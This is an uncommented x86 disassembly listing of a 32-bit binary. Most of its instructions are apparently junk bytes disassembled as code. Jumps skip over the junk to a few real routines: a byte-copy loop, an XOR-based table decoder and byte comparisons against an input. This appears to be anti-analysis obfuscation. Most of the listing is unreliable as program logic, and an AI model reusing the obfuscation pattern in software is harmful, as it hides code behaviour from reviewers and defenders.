  40326a:	lock xor al,0x1f
  40326d:	sub    BYTE PTR [esi+edx*8],0x18
  403271:	fstp   DWORD PTR [edx+0x6723175d]
  403277:	jo     0x4032cc
  403279:	pcmpeqd mm5,QWORD PTR [esi-0x7cc32c55]
  403280:	ret    0x8317
  403283:	push   0xffffff96
  403285:	stos   BYTE PTR es:[edi],al
  403286:	mov    eax,0x27d17d17
  40328b:	leave  
  40328c:	loope  0x40329c
  40328e:	sbb    DWORD PTR [edx+0x35d81060],0x4e8c3bfd
  403298:	mov    eax,0x1d515207
  40329d:	push   esp
  40329e:	adc    BYTE PTR [edi-0x5581e121],bl
  4032a4:	cmp    eax,0x1e68f8b8
  4032a9:	pop    ecx
  4032aa:	mov    ss,WORD PTR [eax-0x11]
  4032ad:	mov    dl,0x39
  4032af:	popf   
  4032b0:	gs mov ch,0x47
  4032b3:	test   eax,0xaf291cb0
  4032b8:	retf   0xfb17
  4032bb:	out    0xf,eax
  4032bd:	add    al,al
  4032bf:	push   ecx
  4032c0:	pop    ds
  4032c1:	add    BYTE PTR [ecx],ch
  4032c3:	ret    
  4032c4:	xchg   esp,eax
  4032c5:	jnp    0x403271
  4032c7:	mov    eax,0x273a1fc0
  4032cc:	add    al,BYTE PTR [eax-0x38]
  4032cf:	add    ebp,DWORD PTR [esi-0x7f]
  4032d2:	and    ecx,ebp
  4032d4:	(bad)  
  4032d6:	inc    ebx
  4032d7:	jnp    0x40331f
  4032d9:	(bad)  
  4032da:	int3   
  4032db:	xchg   ebp,eax
  4032dc:	cmp    al,0x2a
  4032de:	xor    DWORD PTR [esi+0x28],edi
  4032e1:	mov    esp,0xaaf43556
  4032e6:	std    
  4032e7:	pushf  
  4032e8:	pop    ds
  4032e9:	imul   eax,edi,0x187bf270
  4032ef:	jl     0x403354
  4032f1:	and    al,0x97
  4032f3:	or     DWORD PTR [ebx-0x13],ebp
  4032f6:	sbb    al,0xcd
  4032f8:	sbb    eax,0x7eaa4c78
  4032fd:	sub    dl,bl
  4032ff:	cmp    ecx,0xffffffde
  403302:	ja     0x4032e9
  403304:	bnd jnp 0x40332b
  403307:	inc    ebp
  403308:	fcomp  QWORD PTR [ecx+0x8c7b6c]
  40330e:	push   ecx
  40330f:	mov    esi,0x28852daa
  403314:	xchg   ecx,eax
  403315:	jno    0x40335b
  403317:	mov    ebp,esp
  403319:	pop    eax
  40331a:	sub    ah,BYTE PTR [edx-0x4a172dea]
  403320:	mov    cl,0xfc
  403322:	loopne 0x4032df
  403324:	sub    al,0x34
  403326:	xchg   esp,eax
  403327:	push   0x12
  403329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40332a:	inc    esi
  40332b:	mov    ds:0xc588689,eax
  403330:	cld    
  403331:	add    eax,0x2b606005
  403336:	mov    DWORD PTR [eax+eax*1+0x57f1172],ebp
  40333d:	lahf   
  40333e:	pushf  
  40333f:	push   ebp
  403340:	fwait
  403341:	and    ecx,DWORD PTR [edx-0x2b]
  403344:	and    eax,0xb134fd77
  403349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40334a:	fwait
  40334b:	pop    edi
  40334c:	stos   BYTE PTR es:[edi],al
  40334d:	test   ah,0x7
  403350:	aaa    
  403351:	imul   ebx,DWORD PTR [edi+ebp*4],0x8fb82b6b
  403358:	repnz cld 
  40335a:	retf   
  40335b:	push   ebx
  40335c:	add    al,0x9a
  40335e:	sub    BYTE PTR [ebx+0x6d75f630],0x36
  403365:	mov    ah,0xfb
  403367:	cmp    ebp,DWORD PTR ds:0x6a496b78
  40336d:	aas    
  40336e:	mov    ebx,esp
  403370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403371:	(bad)  
  403372:	cwde   
  403373:	add    eax,0xb2b89e22
  403378:	jne    0x403371
  40337a:	sub    eax,0x9fde6b86
  40337f:	lock daa 
  403381:	in     al,dx
  403382:	push   ebx
  403383:	sbb    dh,bh
  403385:	inc    ebp
  403386:	inc    edi
  403387:	add    al,0x58
  403389:	or     ebx,DWORD PTR [ebp-0x57c847e9]
  40338f:	add    dh,bl
  403391:	test   BYTE PTR [eax+0x39],ch
  403394:	fcmove st,st(7)
  403396:	mov    ah,0xea
  403398:	push   cs
  403399:	xchg   esi,eax
  40339a:	dec    edi
  40339b:	xchg   esp,eax
  40339c:	hlt    
  40339d:	mov    dl,0x9b
  40339f:	leave  
  4033a0:	imul   esp,ebp,0xffffffee
  4033a3:	mov    esp,0xc508c743
  4033a8:	mov    DWORD PTR [ebp+0x66],ebx
  4033ab:	das    
  4033ac:	popf   
  4033ad:	rcr    eax,0x73
  4033b0:	(bad)  
  4033b1:	cmp    BYTE PTR [eax],al
  4033b3:	stos   DWORD PTR es:[edi],eax
  4033b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033b5:	xchg   edx,eax
  4033b6:	dec    ecx
  4033b7:	or     DWORD PTR [edx],eax
  4033b9:	pusha  
  4033ba:	dec    esp
  4033bb:	int    0xd1
  4033bd:	in     al,dx
  4033be:	(bad)
  4033c1:	rcl    esp,cl
  4033c3:	neg    DWORD PTR [ebx]
  4033c5:	mov    ebx,0x614caf63
  4033ca:	sbb    ebx,DWORD PTR [ebx]
  4033cc:	adc    al,ah
  4033ce:	and    dh,BYTE PTR [ebx-0x31acda63]
  4033d4:	stos   DWORD PTR es:[edi],eax
  4033d5:	inc    esi
  4033d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033d7:	push   ebx
  4033d8:	sbb    DWORD PTR [ebx+0x7572750c],ecx
  4033de:	add    ch,BYTE PTR [ebp-0x6e1a60ff]
  4033e4:	sbb    eax,0xbf34f4c9
  4033e9:	mov    ss,WORD PTR [eax+0x49334df0]
  4033ef:	cli    
  4033f0:	ja     0x403395
  4033f2:	or     DWORD PTR [eax+0x32],eax
  4033f5:	jns    0x4033bc
  4033f7:	fisub  WORD PTR [edi-0x506be2da]
  4033fd:	addr16 push ss
  4033ff:	jmp    0xd702c93
  403404:	aad    0x25
  403406:	sbb    al,0xbe
  403408:	sti    
  403409:	lea    ecx,[esp+ebx*8]
  40340c:	mov    bl,0xa1
  40340e:	mov    dh,0x5
  403410:	jecxz  0x4033a7
  403412:	test   al,0x9b
  403414:	push   ecx
  403415:	cmp    bl,ch
  403417:	retf   
  403418:	mov    esi,0x32729b
  40341d:	neg    DWORD PTR ds:0x4302d9
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	mov    edi,0x29c1bb4
  403457:	adc    al,0x7e
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x403447
  40345f:	retf   0xaa0a
  403462:	fsub   QWORD PTR [eax]
  403464:	out    0x53,al
  403466:	mov    ebx,0x9aa25c8a
  40346b:	int3   
  40346c:	or     edi,DWORD PTR [edi+0x34111bf3]
  403472:	inc    edx
  403473:	inc    ecx
  403474:	stos   BYTE PTR es:[edi],al
  403475:	and    al,0x39
  403477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403478:	xchg   edx,eax
  403479:	jmp    0x67d6:0xa99217c6
  403480:	push   edi
  403481:	shl    esp,1
  403483:	and    eax,ebp
  403485:	or     eax,0xdf144b5f
  40348a:	ret    
  40348b:	fsub   QWORD PTR [edi]
  40348d:	sbb    bl,BYTE PTR [ebp-0x73]
  403490:	cmp    ebp,DWORD PTR [ebp-0x15]
  403493:	out    dx,al
  403494:	cs xchg esp,ebp
  403497:	adc    bl,BYTE PTR ds:0xe01e0370
  40349d:	(bad)  
  40349e:	mov    edx,0xb5cb29f1
  4034a3:	mov    ds:0x2d803f0,al
  4034a8:	push   esi
  4034a9:	mov    bh,al
  4034ab:	pushf  
  4034ac:	push   ebx
  4034ad:	jge    0x403488
  4034af:	mov    dh,0x5
  4034b1:	aaa    
  4034b2:	repz call 0x57aa:0x8c666ed3
  4034ba:	xchg   esp,eax
  4034bb:	cli    
  4034bc:	scas   al,BYTE PTR es:[edi]
  4034bd:	cmp    DWORD PTR [edx+0x223df99d],ebp
  4034c3:	retf   
  4034c4:	aad    0x16
  4034c6:	ds adc ch,BYTE PTR cs:[esi-0x107d0015]
  4034ce:	xlat   BYTE PTR ds:[ebx]
  4034cf:	ret    0x5550
  4034d2:	inc    ecx
  4034d3:	dec    esi
  4034d4:	outs   dx,BYTE PTR ds:[esi]
  4034d5:	push   edx
  4034d6:	pop    edi
  4034d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034d8:	(bad)  
  4034da:	pop    esp
  4034db:	outs   dx,BYTE PTR ds:[esi]
  4034dc:	ret    0x315f
  4034df:	ror    DWORD PTR [ecx+0x7a54acb0],1
  4034e5:	push   edi
  4034e6:	push   0x5f5718fc
  4034eb:	pushf  
  4034ec:	mov    ch,BYTE PTR [edx]
  4034ee:	jge    0x403554
  4034f0:	not    DWORD PTR [eax+0x3c25a60e]
  4034f6:	loop   0x40353c
  4034f8:	setns  BYTE PTR [esi+0x8c130b8]
  4034ff:	(bad)  
  403500:	mov    ebp,0xbfd1a66b
  403505:	fisub  WORD PTR [ebx]
  403507:	sbb    DWORD PTR [edx+eiz*4],0xffffffbc
  40350b:	adc    DWORD PTR [edx+0x78],ebp
  40350e:	cs test eax,0x1307211e
  403514:	adc    ecx,DWORD PTR [ecx+0x52a66acc]
  40351a:	push   edi
  40351b:	in     al,dx
  40351c:	sbb    DWORD PTR [eax-0x6ed10a65],ebx
  403522:	out    0x95,eax
  403524:	sbb    al,0x13
  403526:	push   esi
  403527:	or     al,0x67
  403529:	push   ebp
  40352a:	popa   
  40352b:	add    bh,0xcb
  40352e:	fidivr WORD PTR [edx+0x64ffd341]
  403534:	cli    
  403535:	jno    0x403592
  403537:	and    ebx,DWORD PTR [ebp-0x48]
  40353a:	leave  
  40353b:	push   ebp
  40353c:	jmp    0x41a531c6
  403541:	imul   esp,DWORD PTR [ebx],0xffffff9b
  403544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403545:	add    edi,ecx
  403547:	outs   dx,BYTE PTR ds:[esi]
  403548:	sub    edx,edi
  40354a:	mov    bh,BYTE PTR [ecx+0x2248efd]
  403550:	mov    edx,0x5d423072
  403555:	in     al,0xe1
  403557:	adc    al,0x55
  403559:	or     eax,eax
  40355b:	das    
  40355c:	ds scas eax,DWORD PTR es:[edi]
  40355e:	adc    eax,0x3a6432a4
  403563:	into   
  403564:	rcl    DWORD PTR [ecx],cl
  403566:	faddp  st(5),st
  403568:	pop    ss
  403569:	adc    eax,0x240575a7
  40356e:	xlat   BYTE PTR ds:[ebx]
  40356f:	hlt    
  403570:	push   edx
  403571:	mov    DWORD PTR [ebp-0x2a5c518],ebx
  403577:	mov    esi,0xea6596a4
  40357c:	adc    eax,0x1c48bf7e
  403581:	data16 js 0x403543
  403584:	bound  ebp,QWORD PTR [ebx+0x39]
  403587:	adc    bh,BYTE PTR [ebx-0xa]
  40358a:	add    al,0xcf
  40358c:	lock inc ebp
  40358e:	inc    esi
  40358f:	in     eax,0xf6
  403591:	(bad)  
  403592:	ficom  WORD PTR [eax+0x3b]
  403595:	jg     0x40357b
  403597:	clc    
  403598:	add    eax,DWORD PTR [esi-0x43]
  40359b:	aaa    
  40359c:	fnstsw ax
  40359e:	push   ss
  40359f:	mov    WORD PTR [edi],gs
  4035a1:	xchg   ebx,eax
  4035a2:	in     al,dx
  4035a3:	dec    ebp
  4035a4:	lea    ebp,[ecx]
  4035a6:	adc    BYTE PTR [edx-0x1a],cl
  4035a9:	mov    DWORD PTR [ebx+0xa2a7508],esp
  4035af:	or     eax,DWORD PTR [edx+0x71fa52f]
  4035b5:	pop    ebx
  4035b6:	sub    esi,DWORD PTR [esi+0x1e0d539]
  4035bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035bd:	ret    0x5a94
  4035c0:	loope  0x4035f8
  4035c2:	jmp    0x4035f3
  4035c4:	dec    eax
  4035c5:	lock sbb al,0xd3
  4035c8:	xlat   BYTE PTR ds:[ebx]
  4035c9:	push   es
  4035ca:	push   eax
  4035cb:	mov    bh,0x59
  4035cd:	mov    dl,0x5a
  4035cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035d0:	mov    ds,WORD PTR [edx+0x5a54ca47]
  4035d6:	test   BYTE PTR [esi+0x157ef97a],0x4e
  4035dd:	ret    0xd0eb
  4035e0:	push   esp
  4035e1:	vunpcklps ymm7,ymm0,YMMWORD PTR [ebx-0x47]
  4035e6:	pushf  
  4035e7:	stc    
  4035e8:	je     0x4035c5
  4035ea:	sbb    eax,ebx
  4035ec:	enter  0x884,0x88
  4035f0:	xchg   DWORD PTR [ebx],ebp
  4035f2:	fimul  WORD PTR [ecx]
  4035f4:	mov    eax,ds:0x458cb5f0
  4035f9:	shl    BYTE PTR [ebx-0x5bf314ce],1
  4035ff:	cmp    BYTE PTR ds:0x511f65b7,ch
  403605:	daa    
  403606:	daa    
  403607:	ret    
  403608:	jmp    0x555c40b3
  40360d:	(bad)  
  40360e:	xor    edx,ecx
  403610:	add    edx,esi
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0xd33dd7c8
  40366f:	push   es
  403670:	mov    ebx,0x7e15b2e9
  403675:	jle    0x403625
  403677:	jg     0x4036f7
  403679:	jle    0x40366d
  40367b:	inc    esi
  40367c:	shr    BYTE PTR [eax-0x75f5acc0],cl
  403682:	jns    0x4036a0
  403684:	inc    esi
  403685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403686:	pop    edx
  403687:	mov    ds:0xcdd043aa,eax
  40368c:	(bad)  
  40368d:	enter  0x2e5,0x73
  403691:	mov    ebp,0x7ce3c595
  403696:	pop    ebx
  403697:	test   eax,0x7dc4f6fc
  40369c:	adc    bh,ah
  40369e:	outs   dx,BYTE PTR ds:[esi]
  40369f:	sbb    al,0x29
  4036a1:	sbb    dh,BYTE PTR [esi+0x7d7a7]
  4036a7:	aam    0xce
  4036a9:	ret    0x1c3a
  4036ac:	jno    0x4036a4
  4036ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036af:	adc    edi,DWORD PTR [esi-0x46]
  4036b2:	mov    dl,0x4d
  4036b4:	mov    WORD PTR [edi+0x36816e7],fs
  4036ba:	add    BYTE PTR ss:[edx],al
  4036bd:	push   0xffffffba
  4036bf:	rol    esp,1
  4036c1:	(bad)  
  4036c2:	cmp    eax,0x92897449
  4036c7:	shl    DWORD PTR [eax+edi*4-0x71951e8c],cl
  4036ce:	push   0x9b7d9b0f
  4036d3:	clc    
  4036d4:	mov    bh,0x6
  4036d6:	loope  0x403666
  4036d8:	int3   
  4036d9:	dec    edi
  4036da:	mov    es,WORD PTR [eax-0x1c65e5a2]
  4036e0:	cs push edi
  4036e2:	out    0x99,al
  4036e4:	dec    ebx
  4036e5:	add    eax,0x58183661
  4036ea:	rcr    ebp,1
  4036ec:	mov    ch,0x27
  4036ee:	scas   eax,DWORD PTR es:[edi]
  4036ef:	fisttp WORD PTR [eax]
  4036f1:	mov    al,dh
  4036f3:	adc    al,0x16
  4036f5:	das    
  4036f6:	mov    bl,0x10
  4036f8:	cmp    ecx,edi
  4036fa:	dec    edi
  4036fb:	popf   
  4036fc:	cmp    al,0x23
  4036fe:	sub    BYTE PTR [ebp-0x47],0x7c
  403702:	pop    DWORD PTR [esi+0xb]
  403705:	add    eax,0xf1a82702
  40370a:	inc    ecx
  40370b:	jnp    0x4036bb
  40370d:	and    edi,DWORD PTR [edi+ebp*1]
  403710:	push   esi
  403711:	cdq    
  403712:	push   edi
  403713:	cmp    al,0x14
  403715:	cli    
  403716:	ins    DWORD PTR es:[edi],dx
  403717:	lock add BYTE PTR [edx+0x2da18fa5],dh
  40371e:	into   
  40371f:	pop    edx
  403720:	dec    edi
  403721:	cmp    eax,0xb857e10f
  403726:	icebp  
  403727:	cld    
  403728:	mov    esi,0x9a9f2c8c
  40372d:	scas   eax,DWORD PTR es:[edi]
  40372e:	sbb    ch,bl
  403730:	jmp    0x40374c
  403732:	mov    eax,DWORD PTR [edx+0x48764f45]
  403738:	pop    ss
  403739:	int    0x85
  40373b:	and    al,0x71
  40373d:	sahf   
  40373e:	out    0xd0,al
  403740:	aad    0x97
  403742:	test   BYTE PTR cs:[edx-0x8269448],bl
  403749:	add    al,cl
  40374b:	stos   BYTE PTR es:[edi],al
  40374c:	lods   al,BYTE PTR ds:[esi]
  40374d:	jl     0x40377d
  40374f:	and    DWORD PTR [edx-0x2d],esi
  403752:	mov    edi,DWORD PTR [ebp+0x78]
  403755:	sahf   
  403756:	pop    ds
  403757:	push   esp
  403758:	lea    esi,[eax-0x38]
  40375b:	out    dx,eax
  40375c:	push   esp
  40375d:	cwde   
  40375e:	ret    
  40375f:	and    al,0x39
  403761:	jmp    0xe7aebd03
  403766:	jae    0x40376d
  403768:	pop    ds
  403769:	mov    al,0xe5
  40376b:	mov    edi,0xf907e2ab
  403770:	repnz push ds
  403772:	push   es
  403773:	xchg   BYTE PTR [ebp-0x62],dh
  403776:	sub    bh,BYTE PTR [edx-0x26d1916b]
  40377c:	out    dx,eax
  40377d:	sub    DWORD PTR [ebx+0x4a1c7e74],edi
  403783:	imul   edx
  403785:	mov    ebp,0x2a41586a
  40378a:	sub    ecx,ebp
  40378c:	pusha  
  40378d:	popa   
  40378e:	or     ch,bl
  403790:	test   al,0xa
  403792:	mov    bh,0x9
  403794:	pop    ebx
  403795:	jns    0x40377f
  403797:	into   
  403798:	(bad)  
  403799:	outs   dx,BYTE PTR ds:[esi]
  40379a:	inc    esi
  40379b:	or     DWORD PTR [ecx],eax
  40379d:	ds dec ebp
  40379f:	xor    al,0xdc
  4037a1:	ja     0x403802
  4037a3:	push   0x2c
  4037a5:	shl    cl,0xa3
  4037a8:	std    
  4037a9:	pop    esi
  4037aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037ab:	clc    
  4037ac:	fcmovu st,st(4)
  4037ae:	inc    edx
  4037af:	cmp    ecx,ebx
  4037b1:	adc    bh,al
  4037b3:	ret    
  4037b4:	retf   
  4037b5:	mov    esp,0xe9b33b4a
  4037ba:	sbb    bl,BYTE PTR ds:0xfe11ed56
  4037c0:	fwait
  4037c1:	mov    eax,0xfcf4efa9
  4037c6:	ss in  eax,dx
  4037c8:	cmp    edx,ebx
  4037ca:	cs inc ebp
  4037cc:	(bad)  
  4037ce:	std    
  4037cf:	cmp    ebp,DWORD PTR [ebx]
  4037d1:	fistp  QWORD PTR [ecx+0x4065a38e]
  4037d7:	addr16 xor eax,0x9bb90ab3
  4037dd:	xchg   ebp,eax
  4037de:	mov    cl,0x40
  4037e0:	xchg   ebx,eax
  4037e1:	scas   al,BYTE PTR es:[edi]
  4037e2:	push   edi
  4037e3:	jne    0x40383d
  4037e5:	iret   
  4037e6:	pushf  
  4037e7:	and    DWORD PTR [ecx],0x12b9ae12
  4037ed:	sbb    eax,0x714d654
  4037f2:	adc    al,BYTE PTR [esi]
  4037f4:	je     0x403815
  4037f6:	push   0xffffffa6
  4037f8:	or     dl,al
  4037fa:	mov    WORD PTR [edi+0x3d],es
  4037fd:	stc    
  4037fe:	jmp    0xa15f:0xf97527b6
  403805:	and    DWORD PTR [ebx],esp
  403807:	fcmovu st,st(4)
  403809:	cmp    al,0x5e
  40380b:	ss mov ecx,0x1eb3ba51
  403811:	je     0x403884
  403813:	mov    edx,0x2b01fcd2
  403818:	mov    ds:0x98133885,eax
  40381d:	jl     0x403842
  40381f:	add    al,BYTE PTR [eax+0x79c06bdd]
  403825:	ins    BYTE PTR es:[edi],dx
  403826:	xchg   BYTE PTR [ebx-0x17],bh
  403829:	retf   
  40382a:	mov    edx,DWORD PTR [ebp+0x10]
  40382d:	xor    eax,ecx
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0x6471e23
  403845:	jmp    0x7fae:0x7e7e13e2
  40384c:	jle    0x4038cc
  40384e:	les    ecx,FWORD PTR [ecx]
  403850:	adc    DWORD PTR ds:0xde6c005c,edi
  403856:	mov    BYTE PTR [ecx+0x21f6e6a2],ch
  40385c:	mov    esi,0x952cabeb
  403861:	leave  
  403862:	inc    ebx
  403863:	das    
  403864:	jge    0x403821
  403866:	mov    cs,WORD PTR [esi-0x11]
  403869:	jmp    0x40388a
  40386b:	je     0x4038c3
  40386d:	mov    bl,0x6a
  40386f:	cwde   
  403870:	or     eax,0x8025fac3
  403875:	pop    ds
  403876:	xor    ebp,DWORD PTR [esi+0x68af4b8b]
  40387c:	pop    edi
  40387d:	test   ebx,ebp
  40387f:	(bad)  
  403881:	test   al,0x4a
  403883:	sub    eax,esi
  403885:	(bad)  
  403886:	adc    DWORD PTR [ecx-0x4206da0f],esi
  40388c:	mov    al,ds:0xca229f3c
  403891:	sub    eax,0x146ec48
  403896:	inc    edx
  403897:	push   edx
  403898:	cmp    dh,BYTE PTR [ecx-0x6]
  40389b:	push   ebp
  40389c:	jp     0x40381e
  40389e:	or     DWORD PTR [ebp+0x7c],ebx
  4038a1:	enter  0x797e,0x45
  4038a5:	or     eax,0xab4076a1
  4038aa:	mov    dh,0xda
  4038ac:	and    BYTE PTR [ecx],al
  4038ae:	into   
  4038af:	mov    eax,0x85c1bc75
  4038b4:	cmp    DWORD PTR [edi-0x3a71677d],edx
  4038ba:	(bad)  
  4038bb:	xlat   BYTE PTR ds:[ebx]
  4038bc:	mov    bh,0x2d
  4038be:	dec    ebx
  4038bf:	inc    ebx
  4038c0:	enter  0x365b,0x7e
  4038c4:	jle    0x403880
  4038c6:	div    BYTE PTR [esp+ebp*4-0x5872f090]
  4038cd:	cmc    
  4038ce:	dec    BYTE PTR [edi-0x3]
  4038d1:	imul   BYTE PTR [ebx-0x58]
  4038d4:	pushf  
  4038d5:	mov    ds:0xd453fa3e,al
  4038da:	(bad)  
  4038db:	xor    bl,BYTE PTR [eax+0x4e14b133]
  4038e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038e2:	pushw  ds
  4038e4:	and    DWORD PTR [ebx],edi
  4038e6:	mov    cl,0xde
  4038e8:	cwde   
  4038e9:	out    0xf4,al
  4038eb:	add    ebp,DWORD PTR [ebp+0x39]
  4038ee:	adc    BYTE PTR [ebx+0x56],dh
  4038f1:	sub    eax,DWORD PTR [ebp+0x20]
  4038f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038f5:	fmul   QWORD PTR [eax+eiz*1-0xc]
  4038f9:	scas   eax,DWORD PTR es:[edi]
  4038fa:	cmc    
  4038fb:	ror    al,1
  4038fd:	or     DWORD PTR [eax],esp
  4038ff:	mov    ebp,0x5fd882bf
  403904:	outs   dx,DWORD PTR ds:[esi]
  403905:	push   ecx
  403906:	inc    eax
  403907:	xor    ebx,DWORD PTR [esi]
  403909:	in     eax,dx
  40390a:	xchg   edx,eax
  40390b:	ret    
  40390c:	inc    edi
  40390d:	bound  esp,QWORD PTR [edx+ebp*2]
  403910:	jp     0x40396d
  403912:	sub    DWORD PTR [edx],ebp
  403914:	call   0xec3c:0xa2759eb3
  40391b:	dec    ebx
  40391c:	popf   
  40391d:	mov    cl,dh
  40391f:	and    eax,DWORD PTR [edi-0x62]
  403922:	dec    edx
  403923:	push   esp
  403924:	mov    ch,0xc3
  403926:	into   
  403927:	ins    BYTE PTR es:[edi],dx
  403928:	aam    0x78
  40392a:	inc    ebp
  40392b:	fisubr WORD PTR [eax-0x335a2cb5]
  403931:	adc    DWORD PTR [ebx+0x4d7f1219],eax
  403937:	ins    DWORD PTR es:[edi],dx
  403938:	call   0x698b0cb8
  40393d:	mov    ah,0xde
  40393f:	icebp  
  403940:	enter  0xbfc1,0x8f
  403944:	fild   DWORD PTR [ebx]
  403946:	xchg   esp,eax
  403947:	lock jne 0x4038dd
  40394a:	pop    esi
  40394b:	mov    bl,0x3f
  40394d:	sbb    edx,eax
  40394f:	pop    eax
  403950:	sbb    edx,esp
  403952:	(bad)  
  403953:	loopne 0x403943
  403955:	inc    eax
  403956:	add    edx,ebx
  403958:	add    al,0x88
  40395a:	push   edi
  40395b:	cmp    eax,0x47a41d4d
  403960:	sbb    dh,BYTE PTR [esi+ecx*4+0x1d96a412]
  403967:	ror    BYTE PTR [esi+0x2f],1
  40396a:	dec    eax
  40396b:	ja     0x403906
  40396d:	sbb    BYTE PTR [edx+0x6a],dh
  403970:	xchg   esp,eax
  403971:	jg     0x403971
  403973:	add    al,0x1b
  403975:	retf   0xbf5b
  403978:	fstp   QWORD PTR [ecx]
  40397a:	int3   
  40397b:	dec    ecx
  40397c:	imul   edx,DWORD PTR ds:0xfd8700f4,0x4db51a42
  403986:	sub    dh,BYTE PTR [esi-0x532472f1]
  40398c:	and    DWORD PTR [edi+ecx*2+0x1e],eax
  403990:	dec    ebx
  403991:	addr16 xor eax,0x2d9471d8
  403997:	ror    BYTE PTR [esi],1
  403999:	lods   al,BYTE PTR ds:[esi]
  40399a:	rcl    BYTE PTR [ebp-0x54],0x6c
  40399e:	cs mov cl,0x21
  4039a1:	cmp    eax,0xc9766e0
  4039a6:	sbb    DWORD PTR [eax-0x4d17d007],ebx
  4039ac:	out    0x54,al
  4039ae:	mov    al,0xed
  4039b0:	add    dl,BYTE PTR [ecx+0x58f6a22b]
  4039b6:	mov    esp,0x22b02deb
  4039bb:	jp     0x892ad871
  4039c1:	push   esp
  4039c2:	xchg   esp,eax
  4039c4:	popa   
  4039c5:	arpl   WORD PTR es:[esi+edi*4+0xc],dx
  4039ca:	cmp    eax,0x130550c9
  4039cf:	aad    0xd7
  4039d1:	cmc    
  4039d2:	popa   
  4039d3:	dec    edx
  4039d4:	add    ah,dl
  4039d6:	mov    bl,0xee
  4039d8:	pop    ss
  4039d9:	les    eax,FWORD PTR [eax]
  4039db:	mov    cl,0xfc
  4039dd:	pop    esi
  4039de:	or     BYTE PTR [ebx],al
  4039e0:	adc    al,0xa7
  4039e2:	cwde   
  4039e3:	std    
  4039e4:	aaa    
  4039e5:	adc    BYTE PTR [esi],al
  4039e7:	jb     0x4039b2
  4039e9:	mov    eax,0x83e76af8
  4039ee:	jmp    0x4e2d1a12
  4039f3:	mov    edi,0xd7119bb
  4039f8:	fstp   TBYTE PTR [ebp-0x2c31220b]
  4039fe:	mov    DWORD PTR [edx],eax
  403a00:	mov    eax,DWORD PTR [ebp-0x8]
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0xb87a268c
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a00
  403a5b:	sbb    edx,edx
  403a5d:	mul    DWORD PTR [ebp-0x16a67d01]
  403a63:	sub    dl,BYTE PTR [eax]
  403a65:	lds    ebp,FWORD PTR [edi-0x34]
  403a68:	cmp    DWORD PTR [edi-0x26989784],ebx
  403a6e:	xchg   esi,esp
  403a70:	and    eax,DWORD PTR [ebx-0x5f]
  403a73:	cld    
  403a74:	ror    BYTE PTR [esi+0x4f2c5ae0],1
  403a7a:	cld    
